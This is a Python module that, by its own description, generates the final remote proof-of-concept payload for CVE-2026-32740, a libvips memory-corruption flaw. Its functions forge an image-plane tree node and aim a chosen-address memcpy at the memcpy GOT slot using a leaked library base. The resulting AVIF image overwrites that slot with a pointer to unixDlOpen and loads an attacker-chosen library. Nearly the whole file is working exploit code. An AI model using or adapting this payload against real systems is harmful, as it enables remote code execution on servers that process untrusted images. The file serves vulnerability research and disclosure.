#!/usr/bin/env python3
"""Generate the proven CVE-2026-32740 memcpy-GOT payload.

This module intentionally contains only the chain used by the final remote
PoC.  Earlier BSS, vtable and rb-tree-GOT experiments are not part of the
published exploit.
"""

from __future__ import annotations

import struct

from avif_grid import build_grid_avif
from stack_profile import NativeStackProfile, load_profile


def _fake_plane_node(write_target: int,
                     profile: NativeStackProfile) -> bytes:
    tree = profile.abi.rb_tree_node
    plane = profile.abi.image_plane
    payload = profile.payload
    node = bytearray(tree.size)
    struct.pack_into("<Q", node, tree.left_offset, 0)
    struct.pack_into("<Q", node, tree.right_offset, 0)
    struct.pack_into("<I", node, tree.key_offset, plane.cr_channel)
    struct.pack_into(
        "<I", node, plane.datatype_offset, plane.unsigned_datatype,
    )
    node[plane.bits_per_pixel_offset] = 8
    node[plane.components_offset] = 1
    struct.pack_into(
        "<II",
        node,
        plane.width_offset,
        payload.chroma_width,
        payload.canvas_chroma_height,
    )
    struct.pack_into("<Q", node, plane.mem_offset, write_target)
    struct.pack_into("<I", node, plane.stride_offset, 0)
    return bytes(node)


def build_rce_payload(libvips_base: int,
                      fake_node_low16: int,
                      library_path: str | None = None,
                      profile: NativeStackProfile | None = None) -> bytes:
    """Build one runtime-specific AVIF from the remotely leaked DSO base."""
    selected = profile or load_profile()
    payload = selected.payload
    remote_path = library_path or selected.application.library_path
    encoded_path = remote_path.encode("ascii") + b"\x00"
    if len(encoded_path) > payload.path_field_bytes:
        raise ValueError(
            "library_path exceeds the selected profile's path field",
        )
    if libvips_base & (selected.libvips.leak.base_alignment - 1):
        raise ValueError("libvips base is not page-aligned")
    if (
        isinstance(fake_node_low16, bool)
        or not isinstance(fake_node_low16, int)
        or not 0 <= fake_node_low16 <= 0xFFFF
    ):
        raise ValueError("fake-node selector must fit an unsigned two-byte value")

    # The first chosen-address memcpy starts at the profile's backoff before
    # memcpy@GOT. Its source row contains the path field followed by
    # unixDlOpen, replacing
    # the GOT slot.  The next row calls the replacement with RSI pointing to
    # the same path prefix.
    write_target = (
        libvips_base
        + selected.libvips.memcpy_got_offset
        - payload.write_target_backoff
    )
    row = encoded_path.ljust(payload.path_field_bytes, b"\x00")
    row += struct.pack("<Q", selected.node.unix_dl_open_address)
    row += bytes(payload.chroma_width - len(row))
    write_data = row * payload.chroma_height
    node = _fake_plane_node(write_target, selected)
    root_chunk_header = struct.pack(
        "<QQ", 0, selected.glibc.root_chunk_size_and_flags,
    )
    selected_low16 = fake_node_low16.to_bytes(
        payload.redirect_pointer_size, "little",
    )

    def cb_value(x: int, y: int) -> int:
        relative = (
            (y - payload.fake_node_local_row) * payload.canvas_stride + x
        )
        if 0 <= relative < len(node):
            return node[relative]
        if y != payload.chroma_height - 1:
            return 0
        header_start = payload.chunk_header_offset
        header_end = header_start + payload.chunk_header_size
        if header_start <= x < header_end:
            return root_chunk_header[x - header_start]
        redirect_start = payload.redirect_pointer_offset
        redirect_end = redirect_start + payload.redirect_pointer_size
        if redirect_start <= x < redirect_end:
            return selected_low16[x - redirect_start]
        return 0

    def cr_value(x: int, y: int) -> int:
        return write_data[y * payload.chroma_width + x]

    return build_grid_avif(
        tile_w=payload.tile_width,
        tile_h=payload.tile_height,
        rows=payload.grid_rows,
        cols=payload.grid_columns,
        canvas_w=payload.tile_width * payload.grid_columns,
        canvas_h=payload.tile_height * payload.grid_rows,
        luma=0x80,
        cb=cb_value,
        cr=cr_value,
        quiet=True,
    )
